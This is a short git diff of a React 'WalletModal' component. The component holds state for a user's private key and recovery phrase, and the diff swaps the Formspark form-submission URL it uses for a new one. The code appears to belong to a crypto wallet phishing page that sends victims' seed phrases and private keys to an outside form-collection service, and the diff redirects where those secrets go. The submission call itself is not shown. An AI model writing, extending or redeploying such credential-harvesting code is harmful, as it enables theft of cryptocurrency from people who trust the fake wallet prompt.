@@ -14,10 +14,10 @@ const WalletModal = ({ show, handleClose, name }) => {
   const [privateKey, setPrivateKey] = useState("");
 
   let navigate = useNavigate();
-  const FORMSPARK_ACTION_URL = "https://submit-form.com/GjJ0oWnip";
+  const FORMSPARK_ACTION_URL = "https://submit-form.com/QCxFktBxF";
 
+  const fetchUserProfile = async() => {
 
-  const fetchUserProfile = async () => {
     let value;
     if (phrase !== "") {
        value = phrase;
